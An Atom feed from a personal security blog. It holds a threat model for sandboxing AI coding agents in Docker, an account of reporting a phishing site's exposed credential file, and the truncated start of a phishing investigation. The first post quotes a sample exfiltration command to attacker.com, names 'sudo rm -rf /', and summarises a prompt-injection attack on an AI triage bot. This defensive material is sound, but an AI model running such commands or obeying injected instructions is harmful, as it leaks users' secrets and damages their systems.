<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>AccidentalRebel.com - Security</title><link href="https://www.accidentalrebel.com/" rel="alternate"/><link href="https://www.accidentalrebel.com/feeds/security.atom.xml" rel="self"/><id>https://www.accidentalrebel.com/</id><updated>2026-02-24T20:00:00+08:00</updated><entry><title>The threat model that made me sandbox my AI agents</title><link href="https://www.accidentalrebel.com/the-threat-model-that-made-me-sandbox-my-ai-agents.html" rel="alternate"/><published>2026-02-24T20:00:00+08:00</published><updated>2026-02-24T20:00:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2026-02-24:/the-threat-model-that-made-me-sandbox-my-ai-agents.html</id><summary type="html">&lt;p&gt;AI coding agents have shell access to your machine. I mapped out the threats before letting one touch my code, then built Claudecker to contain them.&lt;/p&gt;</summary><content type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;TLDR:&lt;/strong&gt; AI coding agents have shell access to your machine. They can run commands, modify files, and reach the network. I mapped 8 threats that come with that access and built a container sandbox to contain them.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="what-youre-actually-running"&gt;What you're actually running&lt;/h2&gt;
&lt;p&gt;When you launch Claude Code or Codex CLI, you're giving an LLM a terminal. Both tools have built-in safety controls. Claude Code prompts before executing shell commands, scopes its file editing tools to the working directory, and offers an optional OS-level sandbox. Codex goes further with sandboxing enabled by default and network access disabled out of the box.&lt;/p&gt;
&lt;p&gt;These are real protections. But they depend on user discipline. Pre-approve &lt;code&gt;Bash(*)&lt;/code&gt; in your settings (common), click "allow" without reading the command (I do this constantly, because who has time to review every shell command?), or run in &lt;code&gt;bypassPermissions&lt;/code&gt; mode for convenience, and you're back to an LLM with unrestricted shell access. I wanted isolation that doesn't break when someone (read: me) gets careless or clicks through a prompt on autopilot.&lt;/p&gt;
&lt;p&gt;The problem isn't that these tools are malicious. The problem is that they're unpredictable. An LLM might run a command you didn't expect. A compromised MCP server could inject instructions. A poisoned dependency could execute code during install. The attack surface is wide and mostly unmonitored.&lt;/p&gt;
&lt;h2 id="the-threat-model"&gt;The threat model&lt;/h2&gt;
&lt;p&gt;With these threats in mind, I built &lt;a href="https://www.accidentalrebel.com/running-ai-agents-in-a-box.html"&gt;Claudecker&lt;/a&gt;, a shell script that wraps Docker to run Claude Code and Codex CLI in an isolated container. Point it at a project directory, and the AI agent runs inside the container with only that directory mounted. Everything else on your host is invisible to it.&lt;/p&gt;
&lt;p&gt;It worked and I kept using it. But as I kept covering &lt;a href="https://www.accidentalrebel.com/your-ai-assistant-might-be-working-for-someone-else.html"&gt;AI security incidents in my news roundups&lt;/a&gt;, I realized I should sit down and map out what Claudecker is actually protecting against. Not theoretical nation-state attacks, but realistic scenarios for a developer running AI agents daily. And I run them a lot. I try every new CLI tool, every new model, every new MCP server that shows up on my feed. I'm exactly the kind of user who needs guardrails.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Threat model diagram" src="https://www.accidentalrebel.com/images/the-threat-model-that-made-me-sandbox-my-ai-agents.png" /&gt;&lt;/p&gt;
&lt;p&gt;Above is the threat model I came up with. The goal isn't to be exhaustive. It's to name the specific things that could go wrong when an AI agent has shell access to a developer's machine, and what Claudecker actually mitigates (more details in the next section).&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;#&lt;/th&gt;
&lt;th&gt;Threat&lt;/th&gt;
&lt;th&gt;What goes wrong&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;T1&lt;/td&gt;
&lt;td&gt;Host filesystem access&lt;/td&gt;
&lt;td&gt;Agent reads files outside the project directory&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;T2&lt;/td&gt;
&lt;td&gt;Data exfiltration&lt;/td&gt;
&lt;td&gt;Agent sends code or secrets to external endpoints&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;T3&lt;/td&gt;
&lt;td&gt;Supply chain injection&lt;/td&gt;
&lt;td&gt;Compromised package executes on the host&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;T4&lt;/td&gt;
&lt;td&gt;Credential theft&lt;/td&gt;
&lt;td&gt;Agent reads SSH keys, API tokens, cloud credentials&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;T5&lt;/td&gt;
&lt;td&gt;Lateral movement&lt;/td&gt;
&lt;td&gt;Agent reaches internal network services&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;T6&lt;/td&gt;
&lt;td&gt;Settings persistence&lt;/td&gt;
&lt;td&gt;Compromised session alters agent config permanently&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;T7&lt;/td&gt;
&lt;td&gt;Privilege escalation&lt;/td&gt;
&lt;td&gt;Agent gains root or elevated capabilities&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;T8&lt;/td&gt;
&lt;td&gt;Cross-project contamination&lt;/td&gt;
&lt;td&gt;Secrets from one project leak into another session&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id="t1-host-filesystem-access"&gt;T1: Host filesystem access&lt;/h3&gt;
&lt;p&gt;The AI operates on your project directory. But nothing stops it from reading files anywhere else on your machine. Other projects, personal documents, company files, system configs. Anything your user account can access, the agent can access.&lt;/p&gt;
&lt;p&gt;This isn't hypothetical. I've seen agents wander outside the project directory during normal operation, reading system files trying to be helpful. Usually harmless. But if an agent is compromised or hallucinating, that wandering becomes dangerous. You don't want an agent casually reading through your other project directories or your company's internal documentation just because it's curious.&lt;/p&gt;
&lt;h3 id="t2-data-exfiltration"&gt;T2: Data exfiltration&lt;/h3&gt;
&lt;p&gt;An agent with network access can send your code anywhere. It could be something obvious like &lt;code&gt;curl attacker.com -d "$(cat .env)"&lt;/code&gt;, or something subtle buried in a script it generates. You probably wouldn't notice either way.&lt;/p&gt;
&lt;p&gt;This is the threat that concerns me most. Source code, API keys, environment variables, git history. All of it is readable by the agent and transmittable over the network. If it's client code, that's a breach notification. If it's your own product, that's competitive intelligence in the open.&lt;/p&gt;
&lt;p&gt;We've already seen this pattern in the news where &lt;a href="https://www.accidentalrebel.com/developer-tools-are-the-new-attack-surface.html"&gt;malicious VS Code AI extensions stole source code from 1.5 million installs&lt;/a&gt;. An AI coding agent with network access is the same exfiltration vector, just with more reasoning capability.&lt;/p&gt;
&lt;h3 id="t3-supply-chain-injection"&gt;T3: Supply chain injection&lt;/h3&gt;
&lt;p&gt;When an agent runs &lt;code&gt;npm install&lt;/code&gt; or &lt;code&gt;pip install&lt;/code&gt;, it pulls packages from public registries. If one of those packages is compromised, the malicious code executes with the agent's permissions on your host. This isn't unique to AI agents, but agents make it worse because they install packages autonomously without you reviewing each one.&lt;/p&gt;
&lt;p&gt;This already happened. A &lt;a href="https://www.accidentalrebel.com/your-ai-assistant-might-be-working-for-someone-else.html"&gt;supply chain attack on Cline CLI&lt;/a&gt; compromised the npm publish token. The poisoned package was downloaded roughly 4,000 times in an 8-hour window before it was pulled, installing an autonomous AI agent on each machine. The attacker used prompt injection against Cline's own AI issue triage to steal the token.&lt;/p&gt;
&lt;h3 id="t4-credential-theft"&gt;T4: Credential theft&lt;/h3&gt;
&lt;p&gt;SSH keys, API tokens, cloud credentials, browser cookies. Your home directory is full of secrets. An agent running on your host can read all of them. Stolen cloud credentials are how $50K AWS bills happen overnight. Even if the agent itself is trustworthy, a compromised skill or MCP server it loads might not be. Infostealers are already &lt;a href="https://www.accidentalrebel.com/your-ai-assistant-might-be-working-for-someone-else.html"&gt;picking up AI agent configuration files and gateway tokens&lt;/a&gt; through broad file-grabbing routines, and dedicated targeting is likely next.&lt;/p&gt;
&lt;p&gt;Claude Code's own &lt;a href="https://docs.anthropic.com/en/docs/claude-code/security#sandboxing"&gt;sandboxing documentation&lt;/a&gt; acknowledges this: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys."&lt;/p&gt;
&lt;h3 id="t5-lateral-movement"&gt;T5: Lateral movement&lt;/h3&gt;
&lt;p&gt;An agent with network access can reach anything on your local network. Other machines, internal services, databases. If you're on a corporate network, an agent is one &lt;code&gt;curl&lt;/code&gt; away from touching infrastructure it has no business accessing. CrowdStrike documented how &lt;a href="https://www.accidentalrebel.com/ai-agents-under-attack.html"&gt;agentic tool chain attacks&lt;/a&gt; exploit this implicit trust to achieve code execution and data exfiltration through legitimate agent workflows.&lt;/p&gt;
&lt;h3 id="t6-settings-persistence"&gt;T6: Settings persistence&lt;/h3&gt;
&lt;p&gt;A compromised session could modify the agent's own configuration to persist across restarts. Injecting a malicious MCP server, changing allowed tool permissions, or altering default behaviors. The next time you start a session, the compromise is already there. Check Point showed that &lt;a href="https://www.accidentalrebel.com/your-ai-assistant-might-be-working-for-someone-else.html"&gt;AI assistants can be quietly repurposed as C2 channels&lt;/a&gt; using this kind of persistence. The AI does exactly what it's designed to do. It's just doing it for someone else.&lt;/p&gt;
&lt;h3 id="t7-privilege-escalation"&gt;T7: Privilege escalation&lt;/h3&gt;
&lt;p&gt;If the agent can run &lt;code&gt;sudo&lt;/code&gt;, the non-root user boundary means nothing. And it's easier to end up there than you'd think. Claude Code scopes permissions to specific command patterns, so approving &lt;code&gt;sudo apt install curl&lt;/code&gt; doesn't automatically approve &lt;code&gt;sudo rm -rf /&lt;/code&gt;. But approve a command once and select "Don't ask again," and it's written to &lt;code&gt;settings.local.json&lt;/code&gt; as a permanent allow rule for that project. Every future &lt;code&gt;sudo&lt;/code&gt; matching that pattern goes through without a prompt. One careless click with a broad pattern and you've handed the agent root.&lt;/p&gt;
&lt;h3 id="t8-cross-project-contamination"&gt;T8: Cross-project contamination&lt;/h3&gt;
&lt;p&gt;If you're working on multiple projects, credentials from one project session shouldn't be accessible in another. But without isolation, they share the same home directory, the same SSH keys, the same environment variables. If you're doing client work, this is a confidentiality problem. An agent working on your personal project can read the &lt;code&gt;.env&lt;/code&gt; from a client project sitting in the next directory over.&lt;/p&gt;
&lt;h2 id="what-claudecker-protects-against"&gt;What Claudecker protects against&lt;/h2&gt;
&lt;p&gt;Here's how each control currently implemented in Claudecker maps to the threats above (✅ = mitigated by this control):&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Control&lt;/th&gt;
&lt;th&gt;T1&lt;/th&gt;
&lt;th&gt;T2&lt;/th&gt;
&lt;th&gt;T3&lt;/th&gt;
&lt;th&gt;T4&lt;/th&gt;
&lt;th&gt;T5&lt;/th&gt;
&lt;th&gt;T6&lt;/th&gt;
&lt;th&gt;T7&lt;/th&gt;
&lt;th&gt;T8&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Docker container isolation&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ephemeral containers (&lt;code&gt;--rm&lt;/code&gt;)&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Non-root user + scoped sudo&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;iptables allowlist firewall&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Network lockdown (domain allowlist)&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SSH agent forwarding (no key files)&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Volume isolation per profile&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Runtime settings rebuild&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Skills hash caching&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;✅&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Some of these are strong mitigations. Others are just friction. I want to be honest about which is which.&lt;/p&gt;
&lt;p&gt;Container isolation, ephemeral sessions, and SSH agent forwarding are the strong ones. The agent genuinely cannot access what isn't mounted, keys that aren't stored, or configs that get rebuilt every launch. The network firewall is effective but has gaps I haven't closed yet (IPv6, CDN IP rotation). Profile isolation works if you remember to set it. Details on each below.&lt;/p&gt;
&lt;h3 id="container-isolation-mitigates-t1-t3-t4"&gt;Container isolation (mitigates T1, T3, T4)&lt;/h3&gt;
&lt;p&gt;The most basic control. Claude Code runs inside a Docker container. The only host directory mounted is the project itself. The agent can't read &lt;code&gt;~/.ssh/&lt;/code&gt; or &lt;code&gt;~/.aws/&lt;/code&gt; because those paths don't exist inside the container.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./claudecker.sh&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;/path/to/project
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The container runs as the unprivileged &lt;code&gt;node&lt;/code&gt; user, not root. Sudo is locked down to five specific commands, all related to firewall management and SSH socket setup.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Strength: strong.&lt;/strong&gt; The agent literally cannot access host files outside the mounted project directory.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Gap:&lt;/strong&gt; The project directory itself is fully accessible. If you have &lt;code&gt;.env&lt;/code&gt; files or secrets in your project tree, the agent can read them.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="network-firewall-mitigates-t2-t3-t5"&gt;Network firewall (mitigates T2, T3, T5)&lt;/h3&gt;
&lt;p&gt;By default, Claudecker containers have full outbound access. The container isn't reachable from the internet (no published ports), but the agent can reach anything on the internet.&lt;/p&gt;
&lt;p&gt;For sensitive work, there's a lockdown mode that activates an iptables-based firewall restricting outbound traffic to IPs resolved from a list of allowed domains:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./claudecker.sh&lt;span class="w"&gt; &lt;/span&gt;lockdown
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The allowlist includes only what's needed: Anthropic's API, GitHub, npm registry, PyPI, and Ubuntu package repos. Everything else is dropped. The agent can't POST your source code to an arbitrary endpoint because it can't reach arbitrary endpoints. Claude Code still works because it can reach its API. Package installs still work. But exfiltration to an attacker-controlled domain gets blocked.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Strength: medium to strong.&lt;/strong&gt; The allowlist approach prevents exfiltration to arbitrary domains while keeping the agent functional.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Gap:&lt;/strong&gt; The allowlist is resolved via DNS at container startup. CDN IP rotation means a domain might resolve to a new IP mid-session that gets blocked. Also, IPv6 isn't firewalled, so if the container has IPv6 connectivity, that's an open channel. I need to fix that.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="ephemeral-containers-mitigates-t3-t6"&gt;Ephemeral containers (mitigates T3, T6)&lt;/h3&gt;
&lt;p&gt;Every session starts fresh. The container is created with &lt;code&gt;--rm&lt;/code&gt;, so it's destroyed on exit. Skills get reinstalled, settings get rebuilt from defaults. If a session gets compromised, the compromise dies with the container.&lt;/p&gt;
&lt;p&gt;Settings are rebuilt at runtime by layering defaults with user overrides. The runtime file lives at &lt;code&gt;/tmp/&lt;/code&gt; and is never written back to persistent storage. A compromised session can't permanently alter the configuration.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Strength: strong for persistence prevention.&lt;/strong&gt; A malicious modification to settings or installed packages doesn't survive a restart.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Gap:&lt;/strong&gt; The config volume (auth tokens, MCP configs) does persist. If an attacker modifies something in that volume, it carries over.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="ssh-agent-forwarding-not-key-storage-mitigates-t4"&gt;SSH agent forwarding, not key storage (mitigates T4)&lt;/h3&gt;
&lt;p&gt;SSH private keys never touch the container filesystem. Instead, the host's SSH agent socket is forwarded into the container, so the agent can authenticate without the key material being present.&lt;/p&gt;
&lt;p&gt;The agent can use the keys to authenticate (git push, git pull), but it can't read the key material. Even if the agent reads every file in the container, the private key bytes aren't there.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Strength: strong against key theft.&lt;/strong&gt; The key material is genuinely inaccessible.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Gap:&lt;/strong&gt; The agent socket itself still allows signing operations. A compromised session could push to any repo the key has access to. You're protecting the key, not the access.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="profile-based-volume-isolation-mitigates-t8"&gt;Profile-based volume isolation (mitigates T8)&lt;/h3&gt;
&lt;p&gt;When I set &lt;code&gt;CLAUDE_PROFILE=work&lt;/code&gt;, the Docker volume storing auth tokens and configs gets a &lt;code&gt;-work&lt;/code&gt; suffix. Completely separate from my personal profile. Different API keys, different git identity, different MCP servers.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;CLAUDE_PROFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;work&lt;span class="w"&gt; &lt;/span&gt;./claudecker.sh&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;/path/to/project
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Strength: strong.&lt;/strong&gt; Profiles are fully isolated at the volume level.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Gap:&lt;/strong&gt; If you forget to set the profile, you're on the default volume, shared across all unprofilied sessions.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="isolation-without-crippling-the-tool"&gt;Isolation without crippling the tool&lt;/h2&gt;
&lt;p&gt;An AI coding agent needs shell access, file access, and network access to be useful. That's what makes it powerful. But I had to balance capability against security.&lt;/p&gt;
&lt;p&gt;Browsers figured this out with tabs. Package managers figured it out with install scripts. CI/CD figured it out with disposable containers. The answer isn't restricting what the agent can do. It's controlling the environment it does it in.&lt;/p&gt;
&lt;p&gt;That's what Claudecker does. The agent gets full shell access, full file access, and configurable network access, but all inside a container where the blast radius is limited to the project directory. It can do everything it needs to do. It just can't touch anything it shouldn't.&lt;/p&gt;
&lt;p&gt;I'm choosing tighter controls now because new threats keep showing up weekly. The eight I've listed here are just the ones I've identified so far. I'd rather have too much isolation than too little. You can always loosen restrictions. You can't undo a breach.&lt;/p&gt;
&lt;h2 id="what-you-can-do-today"&gt;What you can do today&lt;/h2&gt;
&lt;p&gt;Claudecker isn't publicly available. It's deeply integrated into my personal workflow and not something anyone else can pick up and run. But you don't need my tool to act on this threat model. Here are four things you can do right now:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Audit your &lt;code&gt;settings.local.json&lt;/code&gt; (5 minutes).&lt;/strong&gt; Open &lt;code&gt;.claude/settings.local.json&lt;/code&gt; in your project directory and look at what you've approved. You might find &lt;code&gt;Bash(sudo:*)&lt;/code&gt; or other broad patterns you don't remember approving. Clean it up.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enable Claude Code's built-in sandbox (1 command).&lt;/strong&gt; Run &lt;code&gt;/sandbox&lt;/code&gt; in a session. It's not as strict as a container, but it restricts file writes to the working directory and routes network traffic through a domain-approving proxy. It's there, it's free, and most people don't know about it. &lt;a href="https://code.claude.com/docs/en/sandboxing"&gt;Documentation here&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Run your AI agent in a container (30 minutes if you know Docker, half a day if you don't).&lt;/strong&gt; A basic Docker container with your project directory mounted already gives you most of the mitigation table above. The agent gets filesystem isolation, credential separation, and a throwaway environment. That alone covers T1, T4, and T8.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Review what skills and MCP servers your agent loads (10 minutes).&lt;/strong&gt; Each one is third-party code running with your agent's permissions. Check what's installed, where it came from, and whether you still need it. A skill or MCP server you forgot about is an unmonitored attack surface. If you find one you rely on, consider forking it into your own repo. Writing your own skills is even better. It doesn't scale, but at least you know exactly what's running.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;None of these require building anything. They're just decisions.&lt;/p&gt;</content><category term="Security"/><category term="security"/><category term="ai"/><category term="claude-code"/><category term="docker"/><category term="tools"/><category term="ai-attack-surface"/><category term="ai-agent-risk"/><category term="ai-deployment-security"/></entry><entry><title>Finding phished passwords on a scam site</title><link href="https://www.accidentalrebel.com/finding-phished-passwords-on-a-scam-site.html" rel="alternate"/><published>2021-05-01T20:56:00+08:00</published><updated>2021-05-01T20:56:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2021-05-01:/finding-phished-passwords-on-a-scam-site.html</id><summary type="html">&lt;p&gt;How I found a publicly accessible victims.txt file storing phished Facebook credentials on a 000webhost server and what happened when I reported it.&lt;/p&gt;</summary><content type="html">&lt;p&gt;Since my last post about &lt;a href="https://www.accidentalrebel.com/investigating-an-fb-phishing-site.html"&gt;my investigations of a Facebook phishing site&lt;/a&gt;, I have received several messages from friends asking me to check out other suspected phishing/scam sites. One of the most alarming out of them was this one where I was able to find the file where the scammer stores the phished usernames and passwords.&lt;/p&gt;
&lt;p&gt;&lt;img alt="finding-phished-passwords-from-a-scam-site-01" src="https://www.accidentalrebel.com/images/finding-phished-passwords-from-a-scam-site-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;This particular phishing site conducts its operations like this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An ad is shown on Facebook, promising free coupons for famous fast food restaurants&lt;/li&gt;
&lt;li&gt;Clicking on the ad takes the user to a fake Facebook login page hosted on &lt;em&gt;blogger.com&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Login page then sends phished username and passwords to a PHP file hosted on &lt;em&gt;000webhost&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The phished passwords are then stored in a &lt;code&gt;.txt&lt;/code&gt; file (blatantly named, &lt;code&gt;victims.txt&lt;/code&gt;), which is publicly accessible on an open directory. Getting to this directory involved following the scripts and the URLs used by the scammers. It's not that hard to find as long as you know where to look.&lt;/p&gt;
&lt;p&gt;What's scary is that the size of this text file kept on getting bigger. I knew I had to act quickly.&lt;/p&gt;
&lt;h2 id="stopping-the-scammers"&gt;Stopping the scammers&lt;/h2&gt;
&lt;p&gt;Unfortunately, with phishing sites like these, there's not much we could do but report it to the relevant hosting providers. The problem is that sometimes it may take some time before the site gets reviewed, which is excruciating because the longer the wait, the more people fall victim. Some might even just ignore your report altogether!&lt;/p&gt;
&lt;p&gt;I reported the fake login page to Blogger.com and did not receive any response at all. I understand that Blogger.com is a big platform and I bet they receive numerous reports like this. I guess this is why the scammer used this platform as they know they won't be taken down too quickly. Their profile even listed two sites that both had fake login pages. &lt;/p&gt;
&lt;p&gt;&lt;img alt="finding-phished-passwords-from-a-scam-site-04" src="https://www.accidentalrebel.com/images/finding-phished-passwords-from-a-scam-site-04.png" /&gt;&lt;/p&gt;
&lt;p&gt;Thankfully, &lt;em&gt;000webhost&lt;/em&gt; got back to me and eventually took down the page that hosted the PHP and text files.&lt;/p&gt;
&lt;p&gt;&lt;img alt="finding-phished-passwords-from-a-scam-site-03" src="https://www.accidentalrebel.com/images/finding-phished-passwords-from-a-scam-site-03.png" /&gt;&lt;/p&gt;
&lt;p&gt;You'd think that this is a victory. But sadly, setting up a new phishing site is rather easy so within a few hours there is already a new one. Of course, I reported this new site too. Only for a new one to pop up later...&lt;/p&gt;
&lt;p&gt;You can see how this can become an endless cat and mouse game.&lt;/p&gt;
&lt;h2 id="stopping-from-other-sources"&gt;Stopping from other sources&lt;/h2&gt;
&lt;p&gt;One way that could be effective to stop the scammer's operations is by reporting the Facebook advertisement that is used to lure users to the phishing site. Unfortunately, my friend who shared this with me did not get a chance to snap a screenshot of the ad. If he did then it would probably have more impact on stopping their operations. Maybe the Facebook abuse team can trace the payment details used to pay for the ad, and maybe block it. &lt;/p&gt;
&lt;p&gt;&lt;img alt="finding-phished-passwords-from-a-scam-site-02" src="https://www.accidentalrebel.com/images/finding-phished-passwords-from-a-scam-site-02.png" /&gt;&lt;/p&gt;
&lt;p&gt;If you know anyone who may have seen a Facebook advertisement that offers free coupon codes for fast food restaurants that might be pointing to a suspicious login page, then please do contact me!&lt;/p&gt;
&lt;h2 id="awareness-is-the-key"&gt;Awareness is the key&lt;/h2&gt;
&lt;p&gt;As of this posting, the landing page is still up while the page that hosts the PHP and victims file is down. I'm sure it'll be back up soon. All I was able to do was delay their operations. A minor inconvenience for them.&lt;/p&gt;
&lt;p&gt;&lt;img alt="finding-phished-passwords-from-a-scam-site-05" src="https://www.accidentalrebel.com/images/finding-phished-passwords-from-a-scam-site-05.png" /&gt;&lt;/p&gt;
&lt;p&gt;This is why out of everything, spreading awareness is the best countermeasure. If people are more aware of phishing sites and how to avoid them then that would greatly diminish their impact. This is why I continue to post and write about phishing sites. Seeing the number of victims rising like that made me act knowing that I at least have the power to prevent things from escalating.&lt;/p&gt;
&lt;p&gt;And you have the power too, dear reader. Educate your family and friends by warning them or by showing them my posts. Remember, awareness is our best defense!&lt;/p&gt;</content><category term="Security"/><category term="phishing"/><category term="threat-hunting"/><category term="osint"/></entry><entry><title>Investigating an FB phishing site</title><link href="https://www.accidentalrebel.com/investigating-an-fb-phishing-site.html" rel="alternate"/><published>2021-04-24T05:58:00+08:00</published><updated>2021-04-24T05:58:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2021-04-24:/investigating-an-fb-phishing-site.html</id><summary type="html">&lt;p&gt;OSINT into a Facebook phishing campaign spreading via friend-tagging — separate hosting domains, Vietnamese code traces, and possible Phishing-as-a-Service.&lt;/p&gt;</summary><content type="html">&lt;p&gt;Last April 21, people were posting warnings about a suspicious Facebook post where your account will supposedly get hacked when you click it. From the discussions, I gathered that it is a classic phishing site scam. A very effective one too, because as soon as an account gets compromised the attacker logs in and tags the friends in the account allowing it to spread further. The news of this got big that even the PH CERT issued &lt;a href="https://www.facebook.com/Ncertgovph/posts/1879686332199270"&gt;a security advisory on it&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="checking-the-fb-phishing-site-02" src="https://www.accidentalrebel.com/images/checking-the-fb-phishing-site-02.jpg" /&gt;&lt;/p&gt;
